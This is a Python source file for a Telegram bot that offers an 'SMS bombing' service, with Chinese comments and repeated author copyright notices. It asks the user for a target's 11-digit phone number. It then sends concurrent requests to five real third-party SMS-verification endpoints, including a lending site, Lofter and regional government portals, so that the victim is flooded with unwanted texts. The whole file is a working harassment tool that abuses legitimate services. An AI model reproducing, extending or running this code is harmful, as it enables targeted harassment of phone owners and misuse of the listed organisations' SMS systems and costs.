import requests
import threading
from telebot import TeleBot, types

# 你的Telegram机器人的API token，应该保密
TOKEN = "telegram机器人token"  # 替换为你的机器人token
bot = TeleBot(TOKEN)

# Copyright (c) 散小战开发
# 作者频道@SAN869CN
# 作者高级版机器人@Sanxiaozhan886
# 版权所有，请勿二改
# 保留所有权利。

# 欢迎消息处理
@bot.message_handler(commands=['start'])
def handle_start(message):
    # 发送欢迎消息并提示用户使用 /bomb 命令
    bot.send_message(message.chat.id, "🎉 欢迎使用散小战短信轰炸Bot！使用方法：/bomb 作者高级版机器人 @SANSMS_Bot 作者频道 @SAN869CN 作者 @Sanxiaozhan886")

# Copyright (c) 散小战开发
# 作者频道@SAN869CN
# 作者高级版机器人@Sanxiaozhan886
# 版权所有，请勿二改
# 保留所有权利。

# 轰炸功能
@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    # 发送消息提示用户输入手机号
    bot.send_message(message.chat.id, "🚀 轰炸开始！请输入手机号：")
    # 注册下一步的处理函数
    bot.register_next_step_handler(message, start_bombing)

# Copyright (c) 散小战开发
# 作者频道@SAN869CN
# 作者高级版机器人@Sanxiaozhan886
# 版权所有，请勿二改
# 保留所有权利。

def start_bombing(message):
    # 获取用户输入的手机号
    phone = message.text
    # 验证手机号是否为11位数字
    if not phone.isdigit() or len(phone) != 11:
        bot.send_message(message.chat.id, "🚫 请输入正确的手机号")
        return
    
    # 发送消息提示用户已提交轰炸请求
    bot.send_message(message.chat.id, "📡 已向云端提交轰炸，请等短信飞一会")
    
    # 定义要请求的URL列表，每个URL都拼接了手机号
    urls = [
        f"https://app.jcrcw.com/system/wx_user/send_sms?phone={phone}&isValid=false",  # 金融信贷网短信接口
        f"https://www.lofter.com/lpt/getCaptcha.do?clientType=0&deviceType=pc&phone={phone}&callback=loft.m.register.g.jsonpgetCaptcha",  # 洛杉矶短信接口
        f"http://tykhfw.hunca.com.cn:10070/UnifyOnline/sendMobileCode?mobile={phone}",  # 湖北省统一在线短信接口
        f"https://apis.niuxuezhang.cn/v1/sms-code?phone={phone}",  # 牛学长短信接口
        f"https://bsx.baoding12345.cn/web/bduser/register?mobile={phone}",  # 保定12345短信接口
    ]

# Copyright (c) 散小战开发
# 作者频道@SAN869CN
# 作者高级版机器人@Sanxiaozhan886
# 版权所有，请勿二改
# 保留所有权利。

    # 创建线程列表
    threads = []
    # 遍历URL列表，为每个URL创建一个线程
    for url in urls:
        t = threading.Thread(target=send_sms, args=(url,))
        t.start()
        threads.append(t)
    
    # 等待所有线程完成
    for t in threads:
        t.join()
    
    # 发送消息提示用户轰炸完成
    bot.send_message(message.chat.id, "🎉 轰炸已完毕！")

# Copyright (c) 散小战开发
# 作者频道@SAN869CN
# 作者高级版机器人@Sanxiaozhan886
# 版权所有，请勿二改
# 保留所有权利。

def send_sms(url):
    # 发送GET请求
    try:
        response = requests.get(url)
        response.raise_for_status()  # 检查请求是否成功
        print(f"请求成功：{url} - {response.text}")  # 打印请求结果
    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP错误：{url} - {http_err}")
    except requests.exceptions.ConnectionError as conn_err:
        print(f"连接错误：{url} - {conn_err}")
    except requests.exceptions.Timeout as timeout_err:
        print(f"请求超时：{url} - {timeout_err}")
    except requests.exceptions.RequestException as req_err:
        print(f"请求发生错误：{url} - {req_err}")

# Copyright (c) 散小战开发
# 作者频道@SAN869CN
# 作者高级版机器人@Sanxiaozhan886
# 版权所有，请勿二改
# 保留所有权利。

# 启动机器人
bot.polling()